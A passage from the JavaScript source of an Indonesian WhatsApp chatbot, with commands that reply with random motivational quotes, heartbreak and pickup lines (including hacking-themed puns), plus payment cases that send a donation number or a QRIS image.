            "ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
            "ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
            "ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
            "ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
            "ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
            "ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
            "ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
            "ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
            "ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
            "ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
            "ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
            "ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
            "ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ.",
          ];
          let motivasii = pickRandom(motivasi);
          reply(`"${motivasii}"`);
        }
        break;

      case "quotesgalau":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }
          const galau = [
            "Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji",
            "Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu",
            "Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu",
            "Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu",
            "Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu",
            "Tak semudah itu melupakanmu",
            "Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya",
            "Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya",
            "Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya",
            "Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama",
            "Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya",
            "Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku",
            "Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati",
            "Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya",
            "Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu",
            "Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat",
            "Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya",
            "Tolong jangan pergi saat aku sudah sangat sayang padamu",
            "Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget",
            "Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu",
            "Sakit itu ketika cinta yang aku beri tidak kamu hargai",
            "Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu",
            "Karenamu aku jadi tau cinta yang sesungguhnya",
            "Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih",
            "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
            "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
            "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
            "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
            "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
            "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
            "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
            "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
            "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
            "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
            "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
            "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
            "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
            "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
            "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
            "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
            "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
            "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
            "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
            "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
            "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
            "Aku berdiri disini sendiri menunggu kehadiran dirimu",
            "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
            "Maaf aku lupa ternyata aku bukan siapa-siapa",
            "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
            "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
            "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
            "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
            "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
            "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
            "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
            "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
            "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
            "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
            "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
            "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
            "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
            "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
            "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
            "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
            "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
            "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
            "Dari sekian lama menunggu apa yang sudah didapat",
            "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
            "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
            "Aku terlahir sederhana dan ditinggal sudah biasa",
            "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
            "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
            "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
            "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
            "Jangan paksa aku menjadi cewek seperti seleramu",
            "Hanya yang sabar yang mampu melewati semua kekecewaan",
            "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
            "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
            "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
            "Punya kalimat sendiri & mau ditambahin? chat *.owner*",
          ];
          let bacotan = pickRandom(galau);
          reply(bacotan);
        }
        break;

      case "quotesgombal":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }
          const gombal = [
            "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
            "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
            "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
            "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
            "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
            "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
            "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
            "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
            "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
            "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
            "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
            "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
            "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
            "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
            "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
            "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
            "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
            "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
            "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
            "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
            "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
            "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
            "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
            "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
            "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
            "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
            "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
            "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
            "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
            "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
            "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
            "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
            "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
            "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
            "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
            "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
            "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
            "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
            "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
            "Akuu tuh bikin aku ga bisa tidur tau ga?",
            "Soalnya kamu selalu ada dibayang-bayang aku terus.",
            "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
            "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
            "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
            "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
            "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
            "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
            "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
            "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
            "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
            "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
            "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
            "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
            "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
            "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
            "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
            "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
            "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
            "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
            "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
            "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
            "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
            "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
            "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
            "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
            "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
            "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
            "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
            "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
            "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
            "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
            "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
            "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
            "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu.",
          ];
          let bacotan = pickRandom(gombal);
          reply(bacotan);
        }
        break;
      //=========================================\\======

      case "quoteshacker":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }
          const heker = [
            "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
            "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
            "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
            "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
            "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg openbasedir enabled.",
            "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
            "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
            "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
            "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
            "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
            "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
            "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
            "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
            "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
            "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
            "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
            "SQLI ( Structured Query Love Injection )",
            "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
            "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
            "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
            "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
            "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
            "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
            "Jangan men-dualboot-kan hatiku kepadamu.",
            "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
            "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
            "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
            "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!",
          ];

          let bacotan = pickRandom(heker);
          reply(bacotan);
        }
        break;

      case "quotesbijak":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }
          const quotes = [
            "Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
            "Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
            "Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
            "Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
            "Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
            "Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
            "Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
            "Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
            "Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
            "Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
            "Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
            "Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
            "Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
            "Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
            "Hidup tak selamanya tentang pacar.",
            "Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
            "Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
            "Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
            "Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
            "Aku memang diam. Tapi aku tidak buta.",
          ];
          let bacotan = pickRandom(quotes);
          reply(bacotan);
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗤𝗨𝗢𝗧𝗘𝗦 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗦 𝗧 𝗢  𝗥 𝗘    -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "dana":
        {
          await Kilianhst.sendMessage(m.chat, {
            react: { text: "💵", key: m.key },
          });
          reply(`Nih Kak dana Kilian: ${global.dana}`);
        }
        break;
      case "Gopay":
        {
          await Kilianhst.sendMessage(m.chat, {
            react: { text: "💵", key: m.key },
          });
          teks28 = `Silahkan Transfes Pakai Qris Kak`;
          Kilianhst.sendMessage(
            from,
            {
              image: { url: "https://files.catbox.moe/1b1d2q.jpg" },
              caption: teks28,
            },
            { quoted: m }
          );
        }
        break;
      case "ovo":
        {
          await Kilianhst.sendMessage(m.chat, {
            react: { text: "💵", key: m.key },
          });
          teks28 = `Silahkan Tf Pakai Qris Aja Kak`;
          Kilianhst.sendMessage(
            from,
            {
              image: { url: "https://files.catbox.moe/1b1d2q.jpg" },
              caption: teks28,
            },
